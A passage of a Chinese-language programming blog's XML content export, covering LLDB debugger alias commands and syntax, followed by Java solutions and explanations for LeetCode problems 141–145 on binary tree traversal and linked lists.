</span><br><span class="line">缩写命令 (使用 &apos;help command alias&apos;查看更多信息):</span><br><span class="line"> </span><br><span class="line">  add-dsym  -- (&apos;target symbols add&apos;)  通过指定调试符号文件的路径，或使用选项指定下载符号的模块，将调试符号文件添加到目标的当前模块中的一个</span><br><span class="line">  attach    -- (&apos;_regexp-attach&apos;)  通过ID或名称附加到进程</span><br><span class="line">  b         -- (&apos;_regexp-break&apos;)  使用几种简写格式之一设置断点</span><br><span class="line">  bt        -- (&apos;_regexp-bt&apos;)  显示当前线程的调用堆栈。通过数字参数设置最多显示帧数。参数“all”显示所有线程</span><br><span class="line">  c         -- (&apos;process continue&apos;)  继续执行当前进程中的所有线程</span><br><span class="line">  call      -- (&apos;expression --&apos;)  计算当前线程上的表达式,使用LLDB的默认格式显示返回的值</span><br><span class="line">  continue  -- (&apos;process continue&apos;)  继续执行当前进程中的所有线程</span><br><span class="line">  detach    -- (&apos;process detach&apos;)  脱离当前目标进程</span><br><span class="line">  di        -- (&apos;disassemble&apos;)  拆分当前目标中的特定说明。 默认为当前线程和堆栈帧的当前函数</span><br><span class="line">  dis       -- (&apos;disassemble&apos;)  同上</span><br><span class="line">  display   -- (&apos;_regexp-display&apos;)  在每次停止时计算表达式（请参阅&apos;help target stop-hook&apos;）</span><br><span class="line">  down      -- (&apos;_regexp-down&apos;)  选择一个新的堆栈帧。默认为移动一个帧，数字参数可以指定值</span><br><span class="line">  env       -- (&apos;_regexp-env&apos;)  查看和设置环境变量的简写</span><br><span class="line">  exit      -- (&apos;quit&apos;)  退出LLDB调试器</span><br><span class="line">  f         -- (&apos;frame select&apos;)  从当前线程中通过索引选择当前堆栈帧（参见&apos;thread backtrace&apos;）</span><br><span class="line">  file      -- (&apos;target create&apos;)  使用参数作为主要可执行文件创建目标</span><br><span class="line">  finish    -- (&apos;thread step-out&apos;)  完成当前堆栈帧的执行并返回后停止。 默认为当前线程</span><br><span class="line">  image     -- (&apos;target modules&apos;)  用于访问一个或多个目标模块的信息的命令</span><br><span class="line">  j         -- (&apos;_regexp-jump&apos;)  将程序计数器设置为新地址</span><br><span class="line">  jump      -- (&apos;_regexp-jump&apos;)  同上</span><br><span class="line">  kill      -- (&apos;process kill&apos;)  终止当前目标进程</span><br><span class="line">  l         -- (&apos;_regexp-list&apos;)  使用几种简写格式之一列出相关的源代码</span><br><span class="line">  list      -- (&apos;_regexp-list&apos;)  同上</span><br><span class="line">  n         -- (&apos;thread step-over&apos;)  源级单步执行、步进调用，默认当前线程</span><br><span class="line">  next      -- (&apos;thread step-over&apos;)  同上</span><br><span class="line">  nexti     -- (&apos;thread step-inst-over&apos;)  指令级单步执行、步进调用，默认当前线程</span><br><span class="line">  ni        -- (&apos;thread step-inst-over&apos;)  同上</span><br><span class="line">  p         -- (&apos;expression --&apos;)  计算当前线程上表达式的值，以LLDB默认格式显示返回值</span><br><span class="line">  parray    -- (&apos;expression -Z %1   --&apos;)  同上</span><br><span class="line">  po        -- 计算当前线程上的表达式。显示由类型作者控制的格式的返回值。</span><br><span class="line">  poarray   -- (&apos;expression -O -Z %1    --&apos;)  计算当前线程上表达式的值，以LLDB默认格式显示返回值</span><br><span class="line">  print     -- (&apos;expression --&apos;)  同上</span><br><span class="line">  q         -- (&apos;quit&apos;)  退出LLDB调试器</span><br><span class="line">  r         -- (&apos;process launch -X true --&apos;)  在调试器中启动可执行文件</span><br><span class="line">  rbreak    -- (&apos;breakpoint set -r %1&apos;)  在可执行文件中设置断点或断点集</span><br><span class="line">  repl      -- (&apos;expression -r  -- &apos;)  E计算当前线程上表达式的值，以LLDB默认格式显示返回值</span><br><span class="line">  run       -- (&apos;process launch -X true --&apos;)  在调试器中启动可执行文件</span><br><span class="line">  s         -- (&apos;thread step-in&apos;)  源级单步执行、步进调用，默认当前线程</span><br><span class="line">  si        -- (&apos;thread step-inst&apos;)  指令级单步执行、步进调用，默认当前线程</span><br><span class="line">  sif       -- 遍历当前块，如果直接步入名称与TargetFunctionName匹配的函数，则停止</span><br><span class="line">  step      -- (&apos;thread step-in&apos;)  源级单步执行、步进调用，默认当前线程</span><br><span class="line">  stepi     -- (&apos;thread step-inst&apos;)  指令级单步执行、步进调用，默认当前线程</span><br><span class="line">  t         -- (&apos;thread select&apos;)  更改当前选择的线程</span><br><span class="line">  tbreak    -- (&apos;_regexp-tbreak&apos;)  使用几种简写格式之一设置单次断点</span><br><span class="line">  undisplay -- (&apos;_regexp-undisplay&apos;)  每次停止时停止显示表达式（由stop-hook索引指定）</span><br><span class="line">  up        -- (&apos;_regexp-up&apos;)  选择较早的堆栈帧。 默认为移动一个帧，数值参数可以指定任意数字</span><br><span class="line">  x         -- (&apos;memory read&apos;)  从当前目标进程的内存中读取</span><br></pre></td></tr></table></figure>
<h3 id="LLDB语法"><a href="#LLDB语法" class="headerlink" title="LLDB语法"></a>LLDB语法</h3><p>LLDB的基本语法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;command&gt; [&lt;subcommand&gt; [&lt;subcommand&gt;...]] &lt;action&gt; [-options [option-value]] [argument [argument...]]</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">breakpoint set -f test.m -l 18</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">command: breakpoint 添加断点命令</span><br><span class="line">action: set 表示设置断点</span><br><span class="line">option: -f 表示在某文件添加断点</span><br><span class="line">arguement: test.m表示要添加断点的文件名为test.m</span><br><span class="line">option: -l 表示某一行</span><br><span class="line">arguement: 18 表示第18行</span><br></pre></td></tr></table></figure>
<h4 id="expression"><a href="#expression" class="headerlink" title="expression"></a>expression</h4><p>expression命令的作用是执行一个表达式，并将表达式返回的结果输出:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expression &lt;cmd-options&gt; -- &lt;expr&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> TOOLS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LLDB </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[145. Binary Tree Postorder Traversal]]></title>
      <url>/wiki/2017/10/30/Leetcode-145-Binary-Tree-Postorder-Traversal/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, return the postorder traversal of its nodes’ values.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [3,2,1]</span><br></pre></td></tr></table></figure>
<p>Follow up: Recursive solution is trivial, could you do it iteratively?</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目和144. Binary Tree Preorder Traversal一摸一样，给出三种方案：</p>
<p>有帮助函数的递归，省去了反复要生成<code>List&lt;Integer&gt;</code>.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    postorderTraversalHelper(root, list);</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postorderTraversalHelper</span><span class="params">(TreeNode root, List&lt;Integer&gt; list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    postorderTraversalHelper(root.left, list);</span><br><span class="line">    postorderTraversalHelper(root.right, list);</span><br><span class="line">    list.add(root.val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接递归</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> list;</span><br><span class="line">    list.addAll(postorderTraversal(root.left));</span><br><span class="line">    list.addAll(postorderTraversal(root.right));</span><br><span class="line">    list.add(root.val);</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>迭代</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    stack.push(root);</span><br><span class="line">    <span class="keyword">while</span>(!stack.isEmpty()) &#123;</span><br><span class="line">        TreeNode cur = stack.pop();</span><br><span class="line">        <span class="keyword">if</span> (cur != <span class="keyword">null</span>) &#123;</span><br><span class="line">            list.add(<span class="number">0</span>,cur.val);</span><br><span class="line">            stack.push(cur.left);</span><br><span class="line">            stack.push(cur.right); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Stack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[144. Binary Tree Preorder Traversal]]></title>
      <url>/wiki/2017/10/30/Leetcode-144-Binary-Tree-Preorder-Traversal/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, return the <em>preorder</em> traversal of its nodes’ values.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br><span class="line">Output: [1,2,3]</span><br></pre></td></tr></table></figure>
<ul>
<li>Follow up: Recursive solution is trivial, could you do it iteratively?</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>常见的还是用递归的办法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    preorderTraversalHelper(root, list); </span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">preorderTraversalHelper</span><span class="params">(TreeNode root, List&lt;Integer&gt; list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    list.add(root.val);</span><br><span class="line">    preorderTraversalHelper(root.left, list);</span><br><span class="line">    preorderTraversalHelper(root.right, list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>论坛上有一种非常优美的方法，巧妙的利用了<code>List.addAll()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">	List&lt;Integer&gt; pre = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">	<span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> pre;</span><br><span class="line">	pre.add(root.val);</span><br><span class="line">	pre.addAll(preorderTraversal(root.left));</span><br><span class="line">	pre.addAll(preorderTraversal(root.right));</span><br><span class="line">	<span class="keyword">return</span> pre;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实上面的LinkedList也可以为ArrayList。</p>
<p>但既然题目都说了，那么用迭代写一下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    stack.push(root);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">        TreeNode cur = stack.pop();</span><br><span class="line">        <span class="keyword">if</span> (cur != <span class="keyword">null</span>) &#123;</span><br><span class="line">            list.add(cur.val);</span><br><span class="line">            stack.push(cur.right);</span><br><span class="line">            stack.push(cur.left);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Stack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[143. Reorder List]]></title>
      <url>/wiki/2017/10/30/Leetcode-143-Reorder-List/</url>
      <content type="html"><![CDATA[<p>Given a singly linked list L: L0→L1→…→Ln-1→Ln,<br>reorder it to: L0→Ln→L1→Ln-1→L2→Ln-2→…</p>
<p>You may <strong>not</strong> modify the values in the list’s nodes, only nodes itself may be changed.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Given 1-&gt;2-&gt;3-&gt;4, reorder it to 1-&gt;4-&gt;2-&gt;3.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Given 1-&gt;2-&gt;3-&gt;4-&gt;5, reorder it to 1-&gt;5-&gt;2-&gt;4-&gt;3.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Given a singly linked list L: L0 → L1 → … → Ln-1 → Ln,</span></span><br><span class="line"><span class="comment"> * reorder it to: L0 → Ln → L1 → Ln-1 → L2 → Ln-2 → …</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You may not modify the values in the list's nodes,</span></span><br><span class="line"><span class="comment"> * only nodes itself may be changed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Example:</span></span><br><span class="line"><span class="comment"> * Given 1-&gt;2-&gt;3-&gt;4, reorder it to 1-&gt;4-&gt;2-&gt;3.</span></span><br><span class="line"><span class="comment"> * Given 1-&gt;2-&gt;3-&gt;4-&gt;5, reorder it to 1-&gt;5-&gt;2-&gt;4-&gt;3.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/reorder-list/description/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 由于后半部分链表需要倒置，所以很显然能直接想到使用stack，</span></span><br><span class="line"><span class="comment"> * 所以分成三部分：</span></span><br><span class="line"><span class="comment"> * 1. 找到中点和终点</span></span><br><span class="line"><span class="comment"> * 2. 把中点-终点部分放入stack中</span></span><br><span class="line"><span class="comment"> * 3. 依次从链表和stack中取出元素，链接起来</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q143ReorderList</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reorderList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode mid = head, tail = head.next;</span><br><span class="line">        <span class="keyword">boolean</span> odd = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((tail != <span class="keyword">null</span>) &amp;&amp; ( tail.next != <span class="keyword">null</span>)) &#123;</span><br><span class="line">            mid = mid.next;</span><br><span class="line">            tail = tail.next.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断链表个数奇偶</span></span><br><span class="line">        <span class="keyword">if</span> (tail == <span class="keyword">null</span>) &#123;</span><br><span class="line">            odd = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Stack&lt;ListNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        mid = mid.next;</span><br><span class="line">        <span class="keyword">while</span> (mid != tail) &#123;</span><br><span class="line">            stack.push(mid);</span><br><span class="line">            mid = mid.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!odd) &#123;</span><br><span class="line">            stack.push(mid);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ListNode res = <span class="keyword">new</span> ListNode(<span class="number">0</span>), pos = head;</span><br><span class="line">        ListNode tmp = res, tmp2;</span><br><span class="line">        <span class="keyword">int</span> size = stack.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size ; i++) &#123;</span><br><span class="line">            tmp2 = pos.next; <span class="comment">// store pos next elem</span></span><br><span class="line">            res.next = pos;</span><br><span class="line">            res.next.next = stack.pop();</span><br><span class="line">            res = res.next.next;</span><br><span class="line">            pos = tmp2; <span class="comment">// resotre pos next elem</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (odd) &#123;</span><br><span class="line">            res.next = pos;</span><br><span class="line">            res = res.next;</span><br><span class="line">        &#125;</span><br><span class="line">        res.next = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        head = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[142. Linked List Cycle II]]></title>
      <url>/wiki/2017/10/30/Leetcode-142-Linked-List-Cycle-II/</url>
      <content type="html"><![CDATA[<p>Given a linked list, return the node where the cycle begins. If there is no cycle, return <code>null</code>.</p>
<p><strong>Note</strong>: Do not modify the linked list.</p>
<p><strong>Follow up</strong>: Can you solve it without using extra space?</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目是LeetCode 141. Linked List Cycle的升级版，前者只需要给出链表是否存在环，现在还要给出环的起始位置。由于Q141有两种解法：一种是哈希表，另一种是两个指针。这里也分别用这两种方法解决问题。</p>
<p>利用HashSet:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">detectCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    HashSet&lt;ListNode&gt; map = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (head != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (map.contains(head)) <span class="keyword">return</span> head;</span><br><span class="line">        map.add(head);</span><br><span class="line">        head = head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用指针来寻找链表中环的位置，一共分为两个步骤：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/LeetCode142E.png?imageslim" alt="LeetCode142E"></p>
<ol>
<li>确定是否有环<ul>
<li>使用慢指针每次移动一步</li>
<li>使用快指针每次移动两步</li>
<li>如果慢指针和快指针在一定时间后相遇，则有环；如果快指针到达链表尾部，则无环。</li>
</ul>
</li>
<li>如果存在环，返回环的起点pt<ul>
<li>$s$是起点start和环的起点ep(entry point)的距离</li>
<li>$m$是环的起点ep和相遇点meet的距离</li>
<li>$r$是环的长度</li>
<li>$n$是慢指针和快指针首次相遇它们绕着环运动的圈数</li>
<li>因为快指针的速度是慢指针的两倍，所以 $s+m = \frac{s+m+n\times r}{2}\rightarrow s+m = n\times r \rightarrow s = (n-1)\times r + (r - m)$，</li>
<li>所以有结论：起点start和环的起点ep(entry point)的距离$s$等于相遇点meet和环的起点ep沿着环的方向的距离。</li>
<li>所以，当慢指针和快指针相遇的时候，我们放另一个慢指针在起点start，然后把快指针变成慢指针。同时移动两个慢指针，它们相遇时的位置，刚好是环的起点ep($s = (n-1)\times r + (r - m)$)。</li>
</ul>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">detectCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 快指针和慢指针</span></span><br><span class="line">    ListNode fast = head, slow = head;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 确定环是否存在于链表当中</span></span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        <span class="keyword">if</span> (slow == fast) <span class="keyword">break</span>; <span class="comment">// 存在环：相遇</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 不存在环</span></span><br><span class="line">    <span class="keyword">if</span> (fast == <span class="keyword">null</span> || fast.next == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在链表首部放置慢指针</span></span><br><span class="line">    slow = head;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 同时移动两个慢指针(快指针也变成慢指针),直到相遇</span></span><br><span class="line">    <span class="keyword">while</span> (fast != slow) &#123;</span><br><span class="line">        fast = fast.next;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> fast;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[141. Linked List Cycle]]></title>
      <url>/wiki/2017/10/30/Leetcode-141-Linked-List-Cycle/</url>
      <content type="html"><![CDATA[<p>Given a linked list, determine if it has a cycle in it.</p>
<p>Follow up:</p>
<p>Can you solve it without using extra space?</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>判断链表是否有环。这里使用两种方案：</p>
<ol>
<li>第一种当然最直接，把元素放到hashset中，然后看该元素是否已经包含在hashset中。</li>
<li>第二种，需要动一点脑子，<ul>
<li>两个指针，一直跑，一前一后，前面的跑的快，后面的跑得慢，看快的是否能追上慢的。</li>
<li>追的上，说明链表肯定是有循环的。如果跑的快的直接跑到终点了，那就是没循环。</li>
</ul>
</li>
</ol>
